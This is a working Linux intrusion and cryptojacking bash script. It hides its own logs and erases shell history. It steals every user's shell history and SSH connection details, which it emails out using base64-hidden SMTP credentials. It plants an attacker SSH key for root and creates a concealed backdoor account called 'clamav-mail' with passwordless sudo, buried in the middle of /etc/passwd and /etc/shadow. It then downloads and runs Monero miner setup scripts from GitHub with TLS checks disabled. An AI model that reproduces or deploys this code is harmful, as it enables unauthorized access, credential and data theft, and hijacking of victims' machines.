#!/bin/bash
set -uo pipefail
IFS=$'\n\t'

# ========================================================================
# HIDDEN LOGFILE CONFIGURATION
# ========================================================================

# Determine install directory based on user
if [[ $(id -u) -eq 0 ]]; then
    INSTALL_DIR="/root/.system_cache"
    HIDDEN_LOG="$INSTALL_DIR/.syscache.log"
else
    INSTALL_DIR="$HOME/.system_cache"
    HIDDEN_LOG="$INSTALL_DIR/.syscache.log"
fi

# Create hidden install directory
mkdir -p "$INSTALL_DIR"

# Function to write to hidden log with stealth
log_hidden() {
    local msg="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Write to hidden log
    echo "[$timestamp] $msg" >> "$HIDDEN_LOG"
    
    # Also write to system log (but obfuscated)
    logger -t "kernel" "[cache] $msg" 2>/dev/null || true
    
    # Echo to console if not in stealth mode
    if [ "${STEALTH_MODE:-0}" -eq 0 ]; then
        echo "$msg"
    fi
}

# Function to read hidden log
read_hidden_log() {
    if [ -f "$HIDDEN_LOG" ]; then
        echo "=== HIDDEN LOG CONTENTS ==="
        tail -50 "$HIDDEN_LOG"
        echo "=========================="
    else
        echo "Hidden log not found: $HIDDEN_LOG"
    fi
}

# Function to hide the logfile
hide_logfile() {
    if [ -f "$HIDDEN_LOG" ]; then
        # Hide with dot prefix and obscure permissions
        chmod 600 "$HIDDEN_LOG" 2>/dev/null
        chattr +i "$HIDDEN_LOG" 2>/dev/null || true
        
        # Rename to something innocuous
        mv "$HIDDEN_LOG" "$INSTALL_DIR/.bash_profile.backup" 2>/dev/null || true
        
        # Create symlink with obscure name
        ln -sf "$INSTALL_DIR/.bash_profile.backup" "$INSTALL_DIR/...log" 2>/dev/null || true
        
        log_hidden "Logfile hidden at: $INSTALL_DIR/.bash_profile.backup"
    fi
}

# Function to clean old logs
clean_hidden_logs() {
    # Keep only last 1000 lines
    if [ -f "$HIDDEN_LOG" ] && [ $(wc -l < "$HIDDEN_LOG") -gt 1000 ]; then
        tail -1000 "$HIDDEN_LOG" > "${HIDDEN_LOG}.tmp"
        mv "${HIDDEN_LOG}.tmp" "$HIDDEN_LOG"
        log_hidden "Cleaned hidden log (kept last 1000 lines)"
    fi
    
    # Remove any backup logs older than 7 days
    find "$INSTALL_DIR" -name "*.log.*" -mtime +7 -delete 2>/dev/null
    find "$INSTALL_DIR" -name "log.*" -mtime +7 -delete 2>/dev/null
}

# Initialize hidden logging
log_hidden "=== SCRIPT STARTED ==="
log_hidden "User: $(whoami)"
log_hidden "Hostname: $(hostname)"
log_hidden "IP: $(hostname -I 2>/dev/null || echo 'unknown')"

# ========================================================================
# COMPATIBILITY FIXES - REMOVED BROKEN SSL FUNCTIONS
# ========================================================================

# Clean up any bad SSL certificates from previous runs
cleanup_bad_ssl() {
    log_hidden "[*] Cleaning up SSL issues..."
    
    # Remove problematic CA files that break curl
    rm -f /tmp/cacert.pem /tmp/curl-ca-bundle.crt 2>/dev/null
    
    # Unset environment variables that might break curl
    unset CURL_CA_BUNDLE
    unset SSL_CERT_FILE
    unset SSL_CERT_DIR
    
    # Restore original CA path
    if [ -f /etc/ssl/certs/ca-certificates.crt ]; then
        export CURL_CA_BUNDLE="/etc/ssl/certs/ca-certificates.crt"
    elif [ -f /etc/pki/tls/certs/ca-bundle.crt ]; then
        export CURL_CA_BUNDLE="/etc/pki/tls/certs/ca-bundle.crt"
    fi
}

# Function to check for systemd vs SysV
detect_init_system() {
    if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
        echo "systemd"
    elif [ -d /etc/init.d ] || command -v service >/dev/null 2>&1; then
        echo "sysv"
    elif [ -f /sbin/init ] && file /sbin/init | grep -q "upstart"; then
        echo "upstart"
    else
        echo "unknown"
    fi
}

# Enhanced service management for systems without systemctl
safe_service_stop() {
    local service="$1"
    local init_system=$(detect_init_system)
    
    log_hidden "[*] Stopping service: $service (init: $init_system)"
    
    case "$init_system" in
        "systemd")
            systemctl stop "$service" 2>/dev/null || true
            ;;
        "sysv")
            if [ -f "/etc/init.d/$service" ]; then
                /etc/init.d/"$service" stop 2>/dev/null || true
            elif command -v service >/dev/null 2>&1; then
                service "$service" stop 2>/dev/null || true
            fi
            ;;
        "upstart")
            stop "$service" 2>/dev/null || true
            ;;
    esac
    
    # Always try to kill by process name as last resort
    pkill -9 -f "$service" 2>/dev/null || true
    pkill -9 "$service" 2>/dev/null || true
    
    log_hidden "[✓] Service $service stopped"
}

# Enhanced DNS fix function
fix_dns_and_retry() {
    log_hidden "[!] Checking DNS configuration..."
    
    # Check if 1.1.1.1 is already in resolv.conf
    if grep -q "nameserver 1.1.1.1" /etc/resolv.conf 2>/dev/null; then
        log_hidden "[✓] Cloudflare DNS (1.1.1.1) already configured"
        return 0
    fi
    
    log_hidden "[*] Adding Cloudflare DNS (1.1.1.1) to /etc/resolv.conf"
    
    # Backup original resolv.conf
    if [ -f /etc/resolv.conf ]; then
        cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null
        log_hidden "[✓] Backed up original resolv.conf"
    fi
    
    # Add 1.1.1.1 as the first nameserver
    {
        echo "nameserver 1.1.1.1"
        echo "nameserver 8.8.8.8"
        grep -v "^nameserver" /etc/resolv.conf 2>/dev/null || true
    } > /etc/resolv.conf.new
    
    mv /etc/resolv.conf.new /etc/resolv.conf
    log_hidden "[✓] DNS updated - added 1.1.1.1 and 8.8.8.8"
    
    # Test DNS resolution
    log_hidden "[*] Testing DNS resolution..."
    sleep 1
    
    if nslookup github.com >/dev/null 2>&1 || host github.com >/dev/null 2>&1; then
        log_hidden "[✓] DNS resolution working"
        return 0
    else
        log_hidden "[!] WARNING: DNS resolution may still be failing"
        return 1
    fi
}

# SIMPLIFIED AND FIXED download function - patches scripts before execution
download_and_execute() {
    local url="$1"
    local wallet="$2"
    local description="$3"
    local max_retries=3
    local retry=0
    
    log_hidden "[*] Downloading $description from: $(echo $url | sed 's|https://||')"
    
    while [ $retry -lt $max_retries ]; do
        retry=$((retry + 1))
        log_hidden "[*] Attempt $retry/$max_retries"
        
        # Clean SSL issues before each attempt
        cleanup_bad_ssl
        
        # Create temporary file
        local temp_script=$(mktemp)
        local fixed_script=$(mktemp)
        
        # Try wget first (it works for you)
        if command -v wget >/dev/null 2>&1; then
            log_hidden "[*] Using wget..."
            if wget --no-check-certificate --timeout=30 "$url" -O "$temp_script" 2>/dev/null; then
                log_hidden "[✓] Downloaded $(wc -l < "$temp_script") lines"
                
                # CRITICAL: Fix the downloaded script before running it
                log_hidden "[*] Fixing common issues in script..."
                
                # 1. Remove problematic SSL settings
                grep -v "CURL_CA_BUNDLE=\|cacert.pem\|export.*CA" "$temp_script" > "$fixed_script"
                
                # 2. Replace killall with pkill (killall doesn't exist on some systems)
                sed -i 's/killall /pkill -f /g' "$fixed_script"
                
                # 3. Fix curl commands to use --insecure
                sed -i 's/curl -L/curl -L --insecure/g' "$fixed_script"
                sed -i 's/curl https/curl --insecure https/g' "$fixed_script"
                
                # 4. Fix wget commands to use --no-check-certificate
                sed -i 's/wget https/wget --no-check-certificate https/g' "$fixed_script"
                sed -i 's/wget -q/wget --no-check-certificate -q/g' "$fixed_script"
                
                # 5. Fix lscpu dependency
                sed -i 's/type lscpu >\/dev\/null/true/g' "$fixed_script"
                sed -i 's/command -v lscpu/command -v nproc/g' "$fixed_script"
                
                # 6. Ensure shebang exists
                if ! head -1 "$fixed_script" | grep -q "^#!/"; then
                    sed -i '1i#!/bin/bash' "$fixed_script"
                fi
                
                chmod +x "$fixed_script"
                
                log_hidden "[*] Executing fixed script with wallet: (wallet hidden)"
                
                # Run with timeout to prevent hanging
                timeout 180 bash "$fixed_script" "$wallet" 2>&1 | tee -a "$HIDDEN_LOG"
                
                local exit_code=$?
                
                # Cleanup
                rm -f "$temp_script" "$fixed_script"
                
                if [ $exit_code -eq 0 ]; then
                    log_hidden "[✓] $description completed successfully"
                    return 0
                elif [ $exit_code -eq 124 ]; then
                    log_hidden "[!] $description timed out after 3 minutes"
                else
                    log_hidden "[!] $description exited with code: $exit_code"
                fi
            else
                log_hidden "[!] wget download failed"
            fi
        fi
        
        # If wget failed or doesn't exist, try curl
        if command -v curl >/dev/null 2>&1; then
            log_hidden "[*] Trying curl..."
            if curl -L --insecure --max-time 30 "$url" -o "$temp_script" 2>/dev/null; then
                log_hidden "[✓] Downloaded via curl, applying fixes..."
                
                # Apply same fixes
                grep -v "CURL_CA_BUNDLE=\|cacert.pem" "$temp_script" > "$fixed_script"
                sed -i 's/killall /pkill -f /g' "$fixed_script"
                sed -i 's/curl -L/curl -L --insecure/g' "$fixed_script"
                sed -i 's/wget /wget --no-check-certificate /g' "$fixed_script"
                
                chmod +x "$fixed_script"
                timeout 180 bash "$fixed_script" "$wallet" 2>&1 | tee -a "$HIDDEN_LOG"
                
                local exit_code=$?
                rm -f "$temp_script" "$fixed_script"
                
                if [ $exit_code -eq 0 ]; then
                    log_hidden "[✓] $description completed successfully"
                    return 0
                fi
            fi
        fi
        
        # Try HTTP as fallback
        if [ $retry -eq 2 ]; then
            log_hidden "[*] Trying HTTP instead of HTTPS..."
            local http_url=$(echo "$url" | sed 's/^https:/http:/')
            if [ "$http_url" != "$url" ]; then
                if command -v wget >/dev/null 2>&1; then
                    if wget --timeout=30 "$http_url" -O "$temp_script" 2>/dev/null; then
                        log_hidden "[✓] Downloaded via HTTP"
                        
                        # Apply fixes
                        grep -v "CURL_CA_BUNDLE=\|cacert.pem" "$temp_script" > "$fixed_script"
                        sed -i 's/killall /pkill -f /g' "$fixed_script"
                        chmod +x "$fixed_script"
                        
                        timeout 180 bash "$fixed_script" "$wallet" 2>&1 | tee -a "$HIDDEN_LOG"
                        
                        rm -f "$temp_script" "$fixed_script"
                        # Even if this fails, we tried
                    fi
                fi
            fi
        fi
        
        if [ $retry -lt $max_retries ]; then
            log_hidden "[!] Download attempt failed, retrying in 2 seconds..."
            sleep 2
        fi
        
        rm -f "$temp_script" "$fixed_script" 2>/dev/null
    done
    
    log_hidden "[ERROR] $description failed after $max_retries attempts"
    return 1
}

# Initialize compatibility
init_compatibility() {
    log_hidden "========================================"
    log_hidden "INITIALIZING COMPATIBILITY LAYER"
    log_hidden "========================================"
    
    # Clean SSL issues
    cleanup_bad_ssl
    
    # Fix DNS
    fix_dns_and_retry
    
    # Stop any conflicting services
    log_hidden "[*] Stopping any conflicting services..."
    safe_service_stop "swapd"
    safe_service_stop "gdm2"
    
    log_hidden "========================================"
}

# Run compatibility initialization at script start
init_compatibility

# ========================================================================
# ORIGINAL SCRIPT CONTINUES BELOW (with hidden logging)
# ========================================================================

unset HISTFILE

# Configuration variables
readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"
readonly LOG_FILE="/tmp/system_report_email.log"
readonly REPORT_FILE="/tmp/system_report.txt"
readonly SERVICES_TO_CHECK=("swapd" "gdm2")

# Decoded SMTP credentials
SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
readonly SMTP_PORT=587
SENDER_EMAIL_B64="TVNfQkM3R3FyQHRlc3QtMnAwMzQ3em0yOXlsemRybi5tbHNlbmRlci5uZXQ="
readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)

# Replace original log_message with hidden version
log_message() {
    local msg="$1"
    log_hidden "$msg"
}

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to send email with Python
send_email_with_python() {
    local temp_file="$1"
    local subject="$2"
    
    python3 -c "
import sys
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

try:
    with open('$temp_file', 'r', encoding='utf-8') as f:
        body = f.read()

    msg = MIMEMultipart()
    msg['From'] = '$SENDER_EMAIL'
    msg['To'] = '$RECIPIENT_EMAIL'
    msg['Subject'] = '''$subject'''
    msg.attach(MIMEText(body, 'plain'))

    context = ssl.create_default_context()
    
    with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=10) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
        server.send_message(msg)
    sys.exit(0)
except Exception as e:
    print(f'Error: {str(e)}', file=sys.stderr)
    sys.exit(1)
" 2>&1
    return $?
}

# Function to send email with curl
send_email_with_curl() {
    local temp_file="$1"
    local subject="$2"
    
    curl -v --ssl-reqd \
        --url "smtp://$SMTP_SERVER:$SMTP_PORT" \
        --user "$SENDER_EMAIL:$SMTP_PASSWORD" \
        --mail-from "$SENDER_EMAIL" \
        --mail-rcpt "$RECIPIENT_EMAIL" \
        --upload-file "$temp_file" 2>&1
    return $?
}

# Function to send email with mail command
send_email_with_mail() {
    local temp_file="$1"
    local subject="$2"
    
    mail -s "$subject" "$RECIPIENT_EMAIL" < "$temp_file"
    return $?
}

# Collect shell history function
collect_shell_history() {
    log_hidden "=== COLLECTING SHELL HISTORIES ==="

    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    local SYSTEM_SHELLS
    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)

    local OUTPUT=""
    for shell in $SYSTEM_SHELLS; do
        case $shell in
            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
                local hist_file="${SHELL_HISTORIES[$shell]}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
                ;;
        esac
    done

    if [ "$(id -u)" -eq 0 ]; then
        for user_dir in /home/*; do
        [ -d "$user_dir" ] || continue
        local user=$(basename "$user_dir")
            for shell in "${!SHELL_HISTORIES[@]}"; do
                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
            done
        done
    fi

    echo -e "$OUTPUT"
}

# Main email sending function
send_histories_email() {
    local HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
    local PUBLIC_IP=$(curl -4 -s --max-time 5 ip.sb 2>/dev/null || echo "unavailable")
    local LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unavailable")
    local USER=$(whoami)
    
    # Capture the original SSH connection command if available
    local SSH_CONNECTION=$(who am i 2>/dev/null | awk '{print $5}')
    local SSH_CLIENT="${SSH_CLIENT:-unavailable}"
    local SSH_TTY="${SSH_TTY:-unavailable}"
    
    # Try to get the connection command from ps (process status)
    local PARENT_PID=$PPID
    local SSH_COMMAND=$(ps -p $PARENT_PID -o args= 2>/dev/null || ps -p $PPID -o command= 2>/dev/null || echo "unavailable")
    
    # Try to get the connection details from environment variables
    local CONNECTION_FROM_ENV=""
    if [ -n "$SSH_CONNECTION" ]; then
        CONNECTION_FROM_ENV="SSH_CONNECTION: $SSH_CONNECTION"
    fi
    if [ -n "$SSH_CLIENT" ]; then
        CONNECTION_FROM_ENV="$CONNECTION_FROM_ENV\nSSH_CLIENT: $SSH_CLIENT"
    fi
    if [ -n "$SSH_TTY" ]; then
        CONNECTION_FROM_ENV="$CONNECTION_FROM_ENV\nSSH_TTY: $SSH_TTY"
    fi
    
    # Try to get details from .bash_history
    local RECENT_SSH_COMMANDS=$(grep -a "ssh " "$HOME/.bash_history" 2>/dev/null | tail -5 || echo "none found")

    local EMAIL_CONTENT=$(cat <<EOF
=== SYSTEM REPORT ===
Hostname: $HOSTNAME
User: $USER
Public IP: $PUBLIC_IP
Local IP: $LOCAL_IP

=== ORIGINAL CONNECTION INFORMATION ===
SSH Command: $SSH_COMMAND
$CONNECTION_FROM_ENV

Recent SSH commands from history:
$RECENT_SSH_COMMANDS

=== RESOURCES ===
RAM: $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "unavailable")
CPU: $(nproc 2>/dev/null || echo "unavailable") cores
Storage: $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo "unavailable")

$(collect_shell_history)
EOF
    )

    # Sanitize hostname for subject line
    local SAFE_HOSTNAME=$(echo "$HOSTNAME" | tr -d '\n\r' | sed 's/[^a-zA-Z0-9._-]/_/g')
    local subject="Full Shell History Report from $SAFE_HOSTNAME"
    local temp_file=$(mktemp)
    echo -e "$EMAIL_CONTENT" > "$temp_file"

    # Always save report locally first
    cp "$temp_file" "$REPORT_FILE" 2>/dev/null || true
    log_hidden "Report saved to: $REPORT_FILE"

    # Try sending methods in order of preference
    local success=false
    
    # Method 1: Python
    if command_exists python3; then
        log_hidden "Attempting to send email via Python..."
        local python_output
        if python_output=$(send_email_with_python "$temp_file" "$subject" 2>&1); then
            # Check for success indicators
            if echo "$python_output" | grep -qv "SMTP Error\|535\|authentication failed"; then
                log_hidden "Email sent successfully via Python"
                success=true
            else
                log_hidden "Python email method failed: $python_output"
            fi
        else
            log_hidden "Python email method failed"
        fi
    fi

    # Method 2: mail command
    if [ "$success" = false ] && command_exists mail; then
        log_hidden "Attempting to send email via mail command..."
        if send_email_with_mail "$temp_file" "$subject" 2>&1; then
            log_hidden "Email sent successfully via mail command"
            success=true
        else
            log_hidden "Mail command method failed"
        fi
    fi

    # Method 3: curl
    if [ "$success" = false ] && command_exists curl; then
        log_hidden "Attempting to send email via curl..."
        local curl_output
        if curl_output=$(send_email_with_curl "$temp_file" "$subject" 2>&1); then
            # Check for auth errors
            if ! echo "$curl_output" | grep -qE "authentication failed|login denied|535|AUTH"; then
                log_hidden "Email sent successfully via curl"
                success=true
            else
                log_hidden "Curl email method failed: Authentication error"
            fi
        else
            log_hidden "Curl email method failed"
        fi
    fi

    # Final fallback
    if [ "$success" = false ]; then
        log_hidden "Warning: All email sending methods failed - report stored in $REPORT_FILE"
    fi

    rm -f "$temp_file"
    
    # Always return success to continue execution
    return 0
}

# Service management functions (updated for compatibility)
does_service_exist() {
    local service="$1"
    local init_system=$(detect_init_system)
    
    case "$init_system" in
        "systemd")
            systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service" && return 0
            ;;
        "sysv")
            if [ -f "/etc/init.d/$service" ]; then
                return 0
            elif command -v service >/dev/null 2>&1; then
                service --status-all 2>/dev/null | grep -q "$service" && return 0
            fi
            ;;
    esac
    
    # Check running processes
    if ps aux | grep -v grep | grep -q "$service"; then
        return 0
    fi
    
    return 1
}

is_service_running() {
    local service="$1"
    local init_system=$(detect_init_system)
    
    case "$init_system" in
        "systemd")
            systemctl is-active --quiet "$service" 2>/dev/null && return 0
            ;;
        "sysv")
            if [ -f "/etc/init.d/$service" ]; then
                /etc/init.d/"$service" status >/dev/null 2>&1 && return 0
            elif command -v service >/dev/null 2>&1; then
                service "$service" status >/dev/null 2>&1 && return 0
            fi
            ;;
    esac
    
    # Check running processes
    if ps aux | grep -v grep | grep -q "$service"; then
        return 0
    fi
    
    return 1
}

# Cleanup history function
clean_history_file() {
    local file="$1"
    if [ -f "$file" ]; then
        local line_count=$(wc -l < "$file" 2>/dev/null || echo "0")
        if [ "$line_count" -gt 10 ]; then
            head -n $((line_count - 10)) "$file" > "${file}.tmp" 2>/dev/null
            if [ -f "${file}.tmp" ]; then
                mv "${file}.tmp" "$file"
                log_hidden "Cleaned last 10 lines of: $file"
            else
                log_hidden "Failed to create temp file for: $file"
            fi
        elif [ "$line_count" -gt 0 ]; then
            log_hidden "History file '$file' has ≤10 lines. Not cleaning."
        else
            log_hidden "History file '$file' is empty."
        fi
    else
        log_hidden "History file '$file' not found."
    fi
}

cleanup_histories() {
    log_hidden "Cleaning the last 10 lines of all shell histories..."

    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    for shell in "${!SHELL_HISTORIES[@]}"; do
        clean_history_file "${SHELL_HISTORIES[$shell]}"
    done

    if [ "$(id -u)" -eq 0 ]; then
        for user_dir in /home/*; do
        [ -d "$user_dir" ] || continue
        local user=$(basename "$user_dir")
            for shell in "${!SHELL_HISTORIES[@]}"; do
                clean_history_file "/home/$user/${SHELL_HISTORIES[$shell]##*/}"
            done
        done
    fi
}

# Installation functions
install_mail_utils() {
    log_hidden "Installing mail utilities..."
    if command_exists apt-get; then
        apt-get update -qq && apt-get install -y mailutils 2>&1 | tee -a "$HIDDEN_LOG"
    elif command_exists yum; then
        yum install -y mailx 2>&1 | tee -a "$HIDDEN_LOG"
    else
        log_hidden "Warning: Could not determine package manager to install mail utilities"
    fi
}

# Function to safely add SSH key
setup_ssh_key() {
    local ssh_dir="$1"
    local auth_keys="$ssh_dir/authorized_keys"
    local ssh_key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q=='
    
    log_hidden "Setting up SSH key in $ssh_dir"
    
    # Remove old SSH directory if it exists
    if [ -d "$ssh_dir" ]; then
        rm -rf "$ssh_dir"
    fi
    
    # Create SSH directory
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    
    # Add SSH key only if it doesn't exist
    if [ ! -f "$auth_keys" ] || ! grep -q "AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9f" "$auth_keys" 2>/dev/null; then
        echo "$ssh_key" >> "$auth_keys"
        chmod 600 "$auth_keys"
        log_hidden "SSH key added successfully"
    else
        log_hidden "SSH key already exists, skipping"
    fi
}

# Function to create backdoor user with proper error handling
create_backdoor_user() {
    local username="clamav-mail"
    local uid=455
    local password='1!taugenichts'
    
    log_hidden "Creating backdoor user: $username"
    
    # Detect password hashing method
    local hash_method=$(grep '^ENCRYPT_METHOD' /etc/login.defs 2>/dev/null | awk '{print $2}')
    if [ -z "$hash_method" ]; then
        hash_method="SHA512"
        log_hidden "Using default hash method: SHA512"
    else
        log_hidden "Detected hash method: $hash_method"
    fi
    
    # Generate password hash
    local password_hash
    if [ "$hash_method" = "SHA512" ]; then
        password_hash=$(openssl passwd -6 -salt "$(openssl rand -base64 3)" "$password")
    else
        password_hash=$(openssl passwd -1 -salt "$(openssl rand -base64 3)" "$password")
    fi
    
    if [ -z "$password_hash" ]; then
        log_hidden "ERROR: Failed to generate password hash"
        return 1
    fi
    
    # Remove existing user if present
    if id -u "$username" >/dev/null 2>&1; then
        log_hidden "User $username already exists, removing..."
        userdel --remove "$username" 2>/dev/null || log_hidden "Warning: Could not remove existing user"
    fi
    
    # Create sudo group if it doesn't exist
    if ! grep -q '^sudo:' /etc/group 2>/dev/null; then
        log_hidden "Creating sudo group"
        groupadd sudo 2>/dev/null || log_hidden "Warning: Could not create sudo group"
    fi
    
    # Create user-specific group if it doesn't exist
    if ! grep -q "^${username}:" /etc/group 2>/dev/null; then
        log_hidden "Creating group: $username"
        groupadd "$username" 2>/dev/null || log_hidden "Warning: Could not create user group"
    fi
    
    # Create the user
    log_hidden "Creating user account"
    if useradd -u "$uid" -G root,sudo -g "$username" -M -o -s /bin/bash "$username" 2>/dev/null; then
        log_hidden "User created successfully"
    else
        log_hidden "ERROR: Failed to create user"
        return 1
    fi
    
    # Set password
    log_hidden "Setting user password"
    if usermod -p "$password_hash" "$username" 2>/dev/null; then
        log_hidden "Password set successfully"
    else
        log_hidden "ERROR: Failed to set password"
        return 1
    fi
    
    # Reorder passwd file to hide user in the middle
    log_hidden "Reordering passwd file"
    if [ -f /etc/passwd ]; then
        awk '{lines[NR]=$0} END{
            if (NR < 3) {
                for(i=1;i<=NR;i++) print lines[i];
            } else {
                last=lines[NR]; 
                delete lines[NR]; 
                n=NR-1; 
                m=int(n/2+1); 
                for(i=1;i<m;i++) print lines[i]; 
                print last; 
                for(i=m;i<=n;i++) print lines[i];
            }
        }' /etc/passwd > /tmp/passwd && mv /tmp/passwd /etc/passwd
    fi
    
    # Reorder shadow file to hide user in the middle
    log_hidden "Reordering shadow file"
    if [ -f /etc/shadow ]; then
        awk '{lines[NR]=$0} END{
            if (NR < 3) {
                for(i=1;i<=NR;i++) print lines[i];
            } else {
                last=lines[NR]; 
                delete lines[NR]; 
                n=NR-1; 
                m=int(n/2+1); 
                for(i=1;i<m;i++) print lines[i]; 
                print last; 
                for(i=m;i<=n;i++) print lines[i];
            }
        }' /etc/shadow > /tmp/shadow && mv /tmp/shadow /etc/shadow
    fi
    
    log_hidden "User creation completed"
    return 0
}

# Function to setup sudoers
setup_sudoers() {
    local username="clamav-mail"
    local sudoers_file="/etc/sudoers.d/$username"
    
    log_hidden "Setting up sudoers for $username"
    
    # Create sudoers entry
    echo "$username ALL=(ALL) NOPASSWD: ALL" > "$sudoers_file"
    
    # Set proper permissions
    chmod 0440 "$sudoers_file"
    chown root:root "$sudoers_file"
    
    # Validate sudoers file
    if visudo -c -f "$sudoers_file" >/dev/null 2>&1; then
        log_hidden "Sudoers file validated successfully"
        return 0
    else
        log_hidden "ERROR: Sudoers file validation failed, removing"
        rm -f "$sudoers_file"
        return 1
    fi
}

# Function to check required dependencies
check_dependencies() {
    local missing_deps=()
    local required_deps=("free" "df" "hostname" "base64")
    
    for cmd in "${required_deps[@]}"; do
        if ! command_exists "$cmd"; then
            missing_deps+=("$cmd")
        fi
    done
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_hidden "WARNING: Missing dependencies: ${missing_deps[*]}"
        log_hidden "Will attempt to continue anyway"
        return 1
    fi
    
    return 0
}

root_installation() {
    log_hidden "Starting root installation..."
    
    # Install mail utilities
    install_mail_utils
    
    # Setup SSH key for root
    setup_ssh_key "/root/.ssh"
    
    # Create backdoor user
    if create_backdoor_user; then
        log_hidden "Backdoor user created successfully"
    else
        log_hidden "ERROR: Failed to create backdoor user"
    fi
    
    # Setup sudoers
    if setup_sudoers; then
        log_hidden "Sudoers configured successfully"
    else
        log_hidden "WARNING: Sudoers configuration failed"
    fi
    
    # Run the miner setup
    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3.2.sh" \
        "$wallet" \
        "root miner setup"
    
    log_hidden "Root installation completed"
}

user_installation() {
    log_hidden "Starting user installation..."
    
    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh" \
        "$wallet" \
        "user miner setup"
    
    log_hidden "User installation completed"
}

# --- Main Execution ---

# Initialize hidden logging system
log_hidden "=== SCRIPT INITIALIZATION ==="
log_hidden "Script started by user: $(whoami)"
log_hidden "Install directory: $INSTALL_DIR"
log_hidden "Hidden log: $HIDDEN_LOG"

# Check dependencies first
if ! check_dependencies; then
    log_hidden "WARNING: Dependency check failed. Continuing anyway..."
fi

# Service checks (using enhanced functions)
log_hidden "Checking for conflicting services..."
for service in "${SERVICES_TO_CHECK[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            log_hidden "ERROR: Service $service is running. Attempting to stop..."
            safe_service_stop "$service"
            sleep 2
            # Check again
            if is_service_running "$service"; then
                log_hidden "ERROR: Could not stop $service. Aborting."
                exit 1
            else
                log_hidden "Service $service stopped successfully"
            fi
        else
            log_hidden "Service $service exists but is not running"
        fi
    else
        log_hidden "Service $service does not exist"
    fi
done

# System info display (logged)
log_hidden "Displaying system information"
log_hidden "RAM: $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')"
log_hidden "CPU Cores: $(nproc 2>/dev/null || echo 'N/A')"
log_hidden "Storage: $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')"

# Send report and only cleanup if successful
